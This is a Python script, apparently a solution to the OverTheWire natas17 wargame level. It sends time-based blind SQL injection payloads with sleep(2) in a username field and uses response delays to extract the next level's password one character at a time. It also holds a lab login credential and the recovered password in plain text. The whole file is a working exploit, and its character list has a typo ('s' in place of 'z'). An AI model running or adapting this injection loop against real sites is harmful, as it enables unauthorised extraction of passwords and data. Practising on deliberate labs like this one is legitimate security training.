import requests
from time import *

url = "http://natas17.natas.labs.overthewire.org/"
uname = 'natas17'
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
all_possible_chars = '0123456789abcdefghijklmnopqrstuvwxysABCDEFGHIJKLMNOPQRSTUVWXYZ'
lis = list()
while(len("".join(lis))<32):
  for char in all_possible_chars:
      start_time = time()
      data = {
          "username":
          'natas18" and binary password like "' + "".join(lis) + char +
          '%" and sleep(2) #'
      }
      r = requests.post(url, data=data, auth=(uname, password))
      end_time = time()
      if (end_time - start_time) > 1.5:
        lis.append(char)
        print("".join(lis))
        break
# natas18_password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP